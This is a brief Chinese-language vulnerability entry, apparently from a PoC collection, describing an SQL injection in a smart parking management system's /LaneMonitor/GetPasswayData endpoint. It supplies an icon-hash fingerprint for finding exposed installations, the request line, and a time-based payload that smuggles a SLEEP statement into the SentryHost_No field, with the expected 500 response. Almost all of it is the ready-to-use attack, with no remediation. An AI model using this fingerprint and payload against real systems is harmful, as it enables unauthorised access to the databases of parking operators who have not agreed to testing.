# 智能停车管理系统GetPasswayData存在SQL注入漏洞

智能停车管理系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="938984120"`
- **请求**：`POST /LaneMonitor/GetPasswayData HTTP/1.1`

**Payload**
```
SentryHost_No=1';SELECT+SLEEP(5)#
```
- **响应特征**：500